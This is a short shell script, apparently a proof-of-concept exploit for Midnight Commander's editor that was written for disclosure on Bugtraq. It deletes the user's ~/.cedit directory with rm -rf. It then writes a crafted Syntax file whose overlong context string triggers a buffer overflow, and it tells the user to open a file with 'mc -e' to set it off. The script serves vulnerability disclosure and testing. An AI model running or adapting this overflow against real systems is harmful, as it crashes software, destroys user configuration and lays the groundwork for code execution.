#!/bin/sh

# mc overflow by madcr
# fastaa ! send to bugtraq !

rm -rf ~/\.cedit ; mkdir ~/\.cedit
echo '# syntax rules version 100000' > ~/\.cedit/Syntax
echo 'file ..\*\\.(s) asm' >> ~/\.cedit/Syntax
echo 'context default aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' >> ~/\.cedit/Syntax
echo so, type: mc -e 1.s
